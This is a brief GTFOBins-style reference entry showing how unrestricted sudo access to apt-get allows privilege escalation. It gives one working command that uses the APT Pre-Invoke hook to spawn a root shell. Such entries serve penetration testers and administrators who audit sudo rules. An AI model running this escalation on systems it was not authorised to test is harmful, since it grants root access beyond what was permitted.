# sudo apt-get Pre-Invoke Hook (GTFOBins)

If `sudo -l` allows `apt-get` (or `apt`) with no argument restrictions, its hook options run arbitrary commands as root before the actual operation:

```bash
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
